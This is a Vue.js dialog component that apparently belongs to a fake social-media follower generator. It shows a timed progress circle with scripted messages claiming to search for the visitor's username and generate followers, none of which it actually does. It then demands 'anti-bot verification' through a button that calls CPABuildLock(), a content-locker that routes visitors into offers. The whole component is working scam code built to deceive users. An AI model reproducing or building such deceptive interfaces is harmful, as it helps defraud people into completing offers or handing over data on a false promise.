<template>
    <v-dialog v-model="model" max-width="400" persistent>
        <v-card>
            <v-container>
                <v-row justify="center">
                    <v-col cols="4">
                        <v-progress-circular
                          :rotate="360"
                          :size="100"
                          :width="15"
                          :value="value"
                          color="red accent-4"
                        >
                          {{ value }}
                        </v-progress-circular>
                    </v-col>
                </v-row>
                <v-row justify="center">
                    <v-col class="text-center" cols="12">
                        <h3 v-html="messages[messageNum]"></h3>
                    </v-col>
                    <v-col cols="12" v-if="messageNum == 5" class="text-center">
                        <v-btn dense large style="width:80%;background:#E53935;font-weight:bold;color:white;font-size : 20px" @click="openOffer()">VERIFY</v-btn>
                    </v-col>
                </v-row>
            </v-container>
            
        </v-card>
    </v-dialog>
</template>
<script>
export default {
    name:'dyalog',
    data(){
        return {
            value :0,
            interval : {},
            messages:[
                'Preparing...',
                'Searching for <span style="font-weight:bold;font-size:1.5em;color:red;font-family:sans-serif">'+this.username+'</span>',
                'Generating '+this.followers,
                'Value generated successfully',
                'Verfication is required',
                'Please complete anti-bot verification. New values will be added to '+'<span style="display:block;font-weight:bold;font-size:1.5em;color:red;font-family:sans-serif">'+this.username+'</span>'+' automatically once you are verified'
                     ], 
            messageNum : 0
        }
    },
    methods : {
        openOffer(){
            CPABuildLock()
        }
    },
    props : ["model","username","followers"],
    mounted(){
        this.interval = setInterval(() =>{
            if(this.value < 100){
                this.value+=20;
                this.messageNum++
            }else clearInterval(this.interval)
        },3000)
    }
}
</script>
